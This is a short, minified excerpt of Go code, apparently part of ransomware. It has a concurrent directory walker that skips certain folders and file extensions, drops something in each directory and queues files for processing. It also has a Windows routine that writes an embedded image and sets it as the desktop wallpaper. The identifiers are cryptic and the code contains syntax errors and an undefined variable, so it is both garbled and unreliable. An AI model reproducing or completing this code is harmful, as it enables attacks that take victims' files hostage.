...
func dw(s*S,f chan<- string,d chan string,m chan struct{},w,dp,fp*sync.WaitGroup){defer w.Done();for v:=range d{m<-struct{}{};func(p string){defer dp.Done();defer func(){<-m}();if is(p){s.as();return};e,r:=os.ReadDir(p);if r!=nil{s.ae();return};dn(p);for _,o:=range e{n:=o.Name();u:=filepath.Join(p,n);if o.IsDir(){if id(n){s.as();continue};s.af();dp.Add(1);go func(z string){d<-z}(u)}else{if iff(n)||ie(filepath.Ext(n)){s.as();continue};fp.Add(1);go func(z string){defer fpp.Done();f<-z}(u)}}}(v)}}
...
func sw(){p:=filepath.Join(os.TempDir(),"wp.jpg");os.WriteFile(p,wD,0644);t,_:_:=syscall.UTF16PtrFromString(p);u:=syscall.NewLazyDLL("user32.dll");r:=u.NewProc("SystemParametersInfoW");r.Call(0x0014,0,uintptr(unsafe.Pointer(t)),0x01|0x02)}
